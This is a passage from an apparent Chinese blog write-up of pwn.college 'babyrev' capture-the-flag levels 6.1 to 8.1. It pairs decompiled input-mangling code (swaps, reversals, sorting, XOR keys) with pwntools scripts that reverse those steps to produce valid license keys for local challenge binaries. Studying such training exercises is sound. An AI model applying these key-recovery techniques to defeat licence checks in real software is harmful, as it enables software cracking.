&lt;= <span class="hljs-number">8</span>; ++j )<br>&#123;<br>  v4 = *((_BYTE *)buf + j);<br>  *((_BYTE *)buf + j) = *((_BYTE *)buf + <span class="hljs-number">18</span> - j);<br>  *((_BYTE *)buf + <span class="hljs-number">18</span> - j) = v4;<br>&#125;<br><span class="hljs-keyword">for</span> ( k = <span class="hljs-number">0</span>; k &lt;= <span class="hljs-number">18</span>; ++k )<br>&#123;<br>  <span class="hljs-keyword">if</span> ( k % <span class="hljs-number">2</span> )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( k % <span class="hljs-number">2</span> == <span class="hljs-number">1</span> )<br>      *((_BYTE *)buf + k) ^= <span class="hljs-number">0x46u</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    *((_BYTE *)buf + k) ^= <span class="hljs-number">0x1Du</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>最终脚本为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&quot;/challenge/babyrev_level6.1&quot;</span>)<br><br><span class="hljs-comment"># 20 20 25 27 27 28 31 35 c8 cd ce cf d1 d5 d9 dc</span><br>hex_string=[<span class="hljs-number">0x80</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0X99</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x83</span>]<br><span class="hljs-comment"># 0x80, 0xD8, 0x4E, 0xC7, 0X99, 0x0B, 0x8B, 0xC8, 0x45, 0xC0, 0x86, 0x06, 0x84, 0xC2, 0x5F, 0xD6, 0x82, 0x03, 0x83</span><br>payload=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-comment"># xor</span><br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">19</span>):<br>    <span class="hljs-keyword">if</span> i % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>:<br>        hex_string[i] ^= <span class="hljs-number">0x46</span><br>    <span class="hljs-keyword">else</span>:<br>        hex_string[i] ^= <span class="hljs-number">0x1d</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>    temp = hex_string[i]<br>    hex_string[i] = hex_string[<span class="hljs-number">18</span> - i]<br>    hex_string[<span class="hljs-number">18</span> - i] = temp<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(hex_string)):<br>    <span class="hljs-keyword">if</span> i % <span class="hljs-number">3</span> == <span class="hljs-number">2</span>:<br>        hex_string[i] ^= <span class="hljs-number">0xeb</span><br>    <span class="hljs-keyword">elif</span> i % <span class="hljs-number">3</span> == <span class="hljs-number">1</span>:<br>        hex_string[i] ^= <span class="hljs-number">0x37</span><br>    <span class="hljs-keyword">else</span>:<br>        hex_string[i] ^= <span class="hljs-number">0xf1</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(hex_string)):<br>    payload += <span class="hljs-built_in">chr</span>(hex_string[i])<br><br><span class="hljs-built_in">print</span>(payload)<br>io.sendafter(<span class="hljs-string">&#x27;Ready to receive your license key!\n&#x27;</span>,payload)<br><br>data = io.recvall()<br><span class="hljs-built_in">print</span>(data.decode())<br><br></code></pre></td></tr></table></figure><p>逆序进行即可。还是比较简单的。</p><h4 id="level7-0"><a href="#level7-0" class="headerlink" title="level7.0"></a>level7.0</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">This</span> challenge is now mangling your input using the `sort` mangler.<br><span class="hljs-attribute">This</span> challenge is now mangling your input using the `swap` mangler for indexes `<span class="hljs-number">16</span>` and `<span class="hljs-number">21</span>`.<br><span class="hljs-attribute">This</span> challenge is now mangling your input using the `swap` mangler for indexes `<span class="hljs-number">9</span>` and `<span class="hljs-number">22</span>`.<br><span class="hljs-attribute">This</span> challenge is now mangling your input using the `swap` mangler for indexes `<span class="hljs-number">3</span>` and `<span class="hljs-number">6</span>`.<br><span class="hljs-attribute">This</span> challenge is now mangling your input using the `reverse` mangler.<br><span class="hljs-attribute">Expected</span> result:<br><br>        <span class="hljs-attribute">79</span> <span class="hljs-number">78</span> <span class="hljs-number">78</span> <span class="hljs-number">68</span> <span class="hljs-number">72</span> <span class="hljs-number">73</span> <span class="hljs-number">72</span> <span class="hljs-number">72</span> <span class="hljs-number">72</span> <span class="hljs-number">74</span> <span class="hljs-number">70</span> <span class="hljs-number">6</span>f <span class="hljs-number">6</span>f <span class="hljs-number">6</span>d <span class="hljs-number">6</span>c <span class="hljs-number">6</span>a <span class="hljs-number">77</span> <span class="hljs-number">67</span> <span class="hljs-number">65</span> <span class="hljs-number">62</span> <span class="hljs-number">64</span> <span class="hljs-number">62</span> <span class="hljs-number">64</span> <span class="hljs-number">61</span> <span class="hljs-number">61</span> <span class="hljs-number">61</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&quot;/challenge/babyrev_level7.0&quot;</span>)<br><br><span class="hljs-comment"># 20 20 25 27 27 28 31 35 c8 cd ce cf d1 d5 d9 dc</span><br>hex_string=[<span class="hljs-number">0x79</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x6f</span>, <span class="hljs-number">0x6f</span>, <span class="hljs-number">0x6d</span>, <span class="hljs-number">0x6c</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x65</span> ,<span class="hljs-number">0x62</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x61</span>]<br>payload=<span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(hex_string)):<br>    payload += <span class="hljs-built_in">chr</span>(hex_string[i])<br><br><span class="hljs-built_in">print</span>(payload)<br>io.sendafter(<span class="hljs-string">&#x27;Ready to receive your license key!\n&#x27;</span>,payload)<br><br>data = io.recvall()<br><span class="hljs-built_in">print</span>(data.decode())<br><br></code></pre></td></tr></table></figure><p>因为sort在第一个的关系，因此实际上我们需要的是找到expected result即可。</p><h4 id="level7-1"><a href="#level7-1" class="headerlink" title="level7.1"></a>level7.1</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// swap  </span><br><span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">13</span>; ++i )<br>  &#123;<br>    v6 = *((_BYTE *)&amp;buf + i);<br>    *((_BYTE *)&amp;buf + i) = *((_BYTE *)&amp;buf + <span class="hljs-number">28</span> - i);<br>    *((_BYTE *)&amp;buf + <span class="hljs-number">28</span> - i) = v6;<br>  &#125;<br><span class="hljs-comment">//sort</span><br>  <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt;= <span class="hljs-number">27</span>; ++j )<br>  &#123;<br>    <span class="hljs-keyword">for</span> ( k = <span class="hljs-number">0</span>; k &lt; <span class="hljs-number">28</span> - j; ++k )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( *((_BYTE *)&amp;buf + k) &gt; *((_BYTE *)&amp;buf + k + <span class="hljs-number">1</span>) )<br>      &#123;<br>        v5 = *((_BYTE *)&amp;buf + k);<br>        *((_BYTE *)&amp;buf + k) = *((_BYTE *)&amp;buf + k + <span class="hljs-number">1</span>);<br>        *((_BYTE *)&amp;buf + k + <span class="hljs-number">1</span>) = v5;<br>      &#125;<br>    &#125;<br>  &#125;<br><span class="hljs-comment">// swap</span><br>  <span class="hljs-keyword">for</span> ( m = <span class="hljs-number">0</span>; m &lt;= <span class="hljs-number">13</span>; ++m )<br>  &#123;<br>    v4 = *((_BYTE *)&amp;buf + m);<br>    *((_BYTE *)&amp;buf + m) = *((_BYTE *)&amp;buf + <span class="hljs-number">28</span> - m);<br>    *((_BYTE *)&amp;buf + <span class="hljs-number">28</span> - m) = v4;<br>  &#125;<br><span class="hljs-comment">// switch</span><br>  <span class="hljs-keyword">for</span> ( n = <span class="hljs-number">0</span>; n &lt;= <span class="hljs-number">28</span>; ++n )<br>  &#123;<br>    <span class="hljs-keyword">switch</span> ( n % <span class="hljs-number">5</span> )<br>    &#123;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>        *((_BYTE *)&amp;buf + n) ^= <span class="hljs-number">0x75u</span>;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        *((_BYTE *)&amp;buf + n) ^= <span class="hljs-number">0x7Eu</span>;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        *((_BYTE *)&amp;buf + n) ^= <span class="hljs-number">1u</span>;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>        *((_BYTE *)&amp;buf + n) ^= <span class="hljs-number">0x3Du</span>;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>        *((_BYTE *)&amp;buf + n) ^= <span class="hljs-number">0xC5u</span>;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">default</span>:<br>        <span class="hljs-keyword">continue</span>;<br>    &#125;<br>  &#125;<br></code></pre></td></tr></table></figure><img src="/2025/03/01/pwn-college-题解/image-20241110102042920.png"  alt="image-20241110102042920" style="zoom:67%;" /><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0x0f</span>, <span class="hljs-number">0</span>x04, <span class="hljs-number">0</span>x7b, <span class="hljs-number">0</span>x47, <span class="hljs-number">0</span>xbf, <span class="hljs-number">0</span>x0c, <span class="hljs-number">0</span>x06, <span class="hljs-number">0</span>x79, <span class="hljs-number">0</span>x4a, <span class="hljs-number">0</span>xb0, <span class="hljs-number">0</span>x01, <span class="hljs-number">0</span>x0d, <span class="hljs-number">0</span>x70, <span class="hljs-number">0</span>x52, <span class="hljs-number">0</span>xaa, <span class="hljs-number">0</span>x18, <span class="hljs-number">0</span>x12, <span class="hljs-number">0</span>x6a, <span class="hljs-number">0</span>x56, <span class="hljs-number">0</span>xae, <span class="hljs-number">0</span>x1f, <span class="hljs-number">0</span>x16, <span class="hljs-number">0</span>x67, <span class="hljs-number">0</span>x59, <span class="hljs-number">0</span>xa6, <span class="hljs-number">0</span>x16, <span class="hljs-number">0</span>x1c, <span class="hljs-number">0</span>x63, <span class="hljs-number">0</span>x5c<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&quot;/challenge/babyrev_level7.1&quot;</span>)<br><br><span class="hljs-comment"># 20 20 25 27 27 28 31 35 c8 cd ce cf d1 d5 d9 dc</span><br>hex_string=[<span class="hljs-number">0x0f</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x7b</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0x0c</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x4a</span>, <span class="hljs-number">0xb0</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x0d</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0xaa</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0xae</span>, <span class="hljs-number">0x1f</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0xa6</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x1c</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x5c</span>]<br>payload=<span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-comment"># xor</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">29</span>):<br>    d = i % <span class="hljs-number">5</span><br>    <span class="hljs-keyword">if</span> d == <span class="hljs-number">0</span>:<br>        hex_string[i] ^= <span class="hljs-number">0x75</span><br>    <span class="hljs-keyword">elif</span> d == <span class="hljs-number">1</span>:<br>        hex_string[i] ^= <span class="hljs-number">0x7e</span><br>    <span class="hljs-keyword">elif</span> d == <span class="hljs-number">2</span>:<br>        hex_string[i] ^= <span class="hljs-number">0x01</span><br>    <span class="hljs-keyword">elif</span> d == <span class="hljs-number">3</span>:<br>        hex_string[i] ^= <span class="hljs-number">0x3d</span><br>    <span class="hljs-keyword">else</span>:<br>        hex_string[i] ^= <span class="hljs-number">0xc5</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(hex_string)):<br>    payload += <span class="hljs-built_in">chr</span>(hex_string[i])<br><br><span class="hljs-built_in">print</span>(payload)<br>io.sendafter(<span class="hljs-string">&#x27;Ready to receive your license key!\n&#x27;</span>,payload)<br><br>data = io.recvall()<br><span class="hljs-built_in">print</span>(data.decode())<br><br></code></pre></td></tr></table></figure><h4 id="level8-0"><a href="#level8-0" class="headerlink" title="level8.0"></a>level8.0</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">This</span> challenge is now mangling your input using the `swap` mangler for indexes `<span class="hljs-number">5</span>` and `<span class="hljs-number">22</span>`.<br><span class="hljs-attribute">This</span> challenge is now mangling your input using the `reverse` mangler.<br><span class="hljs-attribute">This</span> challenge is now mangling your input using the `xor` mangler with key `<span class="hljs-number">0</span>x3c7c`<br><span class="hljs-attribute">This</span> challenge is now mangling your input using the `sort` mangler.<br><span class="hljs-attribute">This</span> challenge is now mangling your input using the `swap` mangler for indexes `<span class="hljs-number">18</span>` and `<span class="hljs-number">33</span>`.<br><span class="hljs-attribute">This</span> challenge is now mangling your input using the `reverse` mangler.<br><span class="hljs-attribute">This</span> challenge is now mangling your input using the `swap` mangler for indexes `<span class="hljs-number">3</span>` and `<span class="hljs-number">10</span>`.<br><span class="hljs-attribute">5f</span> <span class="hljs-number">5</span>e <span class="hljs-number">46</span> <span class="hljs-number">53</span> <span class="hljs-number">58</span> <span class="hljs-number">57</span> <span class="hljs-number">57</span> <span class="hljs-number">57</span> <span class="hljs-number">56</span> <span class="hljs-number">56</span> <span class="hljs-number">5</span>a <span class="hljs-number">52</span> <span class="hljs-number">52</span> <span class="hljs-number">4</span>e <span class="hljs-number">4</span>e <span class="hljs-number">4</span>c <span class="hljs-number">4</span>a <span class="hljs-number">5</span>b <span class="hljs-number">1</span>f <span class="hljs-number">1</span>f <span class="hljs-number">1</span>f <span class="hljs-number">1</span>b <span class="hljs-number">19</span> <span class="hljs-number">16</span> <span class="hljs-number">16</span> <span class="hljs-number">14</span> <span class="hljs-number">14</span> <span class="hljs-number">14</span> <span class="hljs-number">12</span> <span class="hljs-number">11</span> <span class="hljs-number">0</span>d <span class="hljs-number">0</span>c <span class="hljs-number">0</span>b <span class="hljs-number">08</span> <span class="hljs-number">06</span> <span class="hljs-number">05</span><br></code></pre></td></tr></table></figure><p>虽然有这么多层修改，但是只需要关心<code>sort</code>前的修改即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&quot;/challenge/babyrev_level8.0&quot;</span>)<br><br><span class="hljs-comment"># 20 20 25 27 27 28 31 35 c8 cd ce cf d1 d5 d9 dc</span><br>hex_string=[<span class="hljs-number">0x5f</span>, <span class="hljs-number">0x5e</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x4e</span>, <span class="hljs-number">0x4e</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x4a</span>, <span class="hljs-number">0x5b</span>, <span class="hljs-number">0x1f</span>, <span class="hljs-number">0x1f</span>, <span class="hljs-number">0x1f</span>, <span class="hljs-number">0x1b</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x0d</span>, <span class="hljs-number">0x0c</span>, <span class="hljs-number">0x0b</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x05</span>]<br>payload=<span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-comment"># xor</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(hex_string)):<br>    <span class="hljs-keyword">if</span> i % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>:<br>        hex_string[i] ^= <span class="hljs-number">0x3c</span><br>    <span class="hljs-keyword">else</span>:<br>        hex_string[i] ^= <span class="hljs-number">0x7c</span><br><br><span class="hljs-comment"># reverse</span><br>reversed_hex_string = hex_string[::-<span class="hljs-number">1</span>]<br><br><span class="hljs-comment"># swap</span><br>temp = reversed_hex_string[<span class="hljs-number">5</span>]<br>reversed_hex_string[<span class="hljs-number">5</span>] = reversed_hex_string[<span class="hljs-number">22</span>]<br>reversed_hex_string[<span class="hljs-number">22</span>] = temp<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(reversed_hex_string)):<br>    payload += <span class="hljs-built_in">chr</span>(reversed_hex_string[i])<br><br><span class="hljs-built_in">print</span>(payload)<br>io.sendafter(<span class="hljs-string">&#x27;Ready to receive your license key!\n&#x27;</span>,payload)<br><br>data = io.recvall()<br><span class="hljs-built_in">print</span>(data.decode())<br><br></code></pre></td></tr></table></figure><h4 id="level8-1"><a href="#level8-1" class="headerlink" title="level8.1"></a>level8.1</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// swap  0x5e97a08d5571</span><br>v3 = BYTE6(v15);<br>  BYTE6(v15) = v17;<br>  LOBYTE(v17) = v3;<br><span class="hljs-comment">// reverse</span><br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">17</span>; ++i )<br>  &#123;<br>    v7 = *((_BYTE *)&amp;buf + i);<br>    *((_BYTE *)&amp;buf + i) = *((_BYTE *)&amp;buf + <span class="hljs-number">36</span> - i);<br>    *((_BYTE *)&amp;buf + <span class="hljs-number">36</span> - i) = v7;<br>  &#125;<br><span class="hljs-comment">// swap0x5e97a08d55de </span><br>  v4 = BYTE3(buf);<br>  BYTE3(buf) = BYTE4(v14);<br>  BYTE4(v14) = v4;<br><span class="hljs-comment">// xor</span><br>  <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt;= <span class="hljs-number">36</span>; ++j )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( j % <span class="hljs-number">2</span> )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( j % <span class="hljs-number">2</span> == <span class="hljs-number">1</span> )<br>        *((_BYTE *)&amp;buf + j) ^= <span class="hljs-number">0xA4u</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      *((_BYTE *)&amp;buf + j) ^= <span class="hljs-number">0x48u</span>;<br>    &#125;<br>  &#125;<br><span class="hljs-comment">// reverse</span><br>  <span class="hljs-keyword">for</span> ( k = <span class="hljs-number">0</span>; k &lt;= <span class="hljs-number">17</span>; ++k )<br>  &#123;<br>    v6 = *((_BYTE *)&amp;buf + k);<br>    *((_BYTE *)&amp;buf + k) = *((_BYTE *)&amp;buf + <span class="hljs-number">36</span> - k);<br>    *((_BYTE *)&amp;buf + <span class="hljs-number">36</span> - k) = v6;<br>  &#125;<br><span class="hljs-comment">// reverse</span><br>  <span class="hljs-keyword">for</span> ( m = <span class="hljs-number">0</span>; m &lt;= <span class="hljs-number">17</span>; ++m )<br>  &#123;<br>    v5 = *((_BYTE *)&amp;buf + m);<br>    *((_BYTE *)&amp;buf + m) = *((_BYTE *)&amp;buf + <span class="hljs-number">36</span> - m);<br>    *((_BYTE *)&amp;buf + <span class="hljs-number">36</span> - m) = v5;<br>  &#125;<br><span class="hljs-comment">// xor</span><br>  <span class="hljs-keyword">for</span> ( n = <span class="hljs-number">0</span>; n &lt;= <span class="hljs-number">36</span>; ++n )<br>  &#123;<br>    <span class="hljs-keyword">switch</span> ( n % <span class="hljs-number">5</span> )<br>    &#123;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>        *((_BYTE *)&amp;buf + n) ^= <span class="hljs-number">0x5Cu</span>;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        *((_BYTE *)&amp;buf + n) ^= <span class="hljs-number">0xA3u</span>;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        *((_BYTE *)&amp;buf + n) ^= <span class="hljs-number">0xBDu</span>;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>        *((_BYTE *)&amp;buf + n) ^= <span class="hljs-number">0x29u</span>;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>        *((_BYTE *)&amp;buf + n) ^= <span class="hljs-number">0x6Cu</span>;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">default</span>:<br>        <span class="hljs-keyword">continue</span>;<br>    &#125;<br>  &#125;<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0x79</span>, <span class="hljs-number">0</span>x76, <span class="hljs-number">0</span>x8c, <span class="hljs-number">0</span>xe8, <span class="hljs-number">0</span>x55, <span class="hljs-number">0</span>x8e, <span 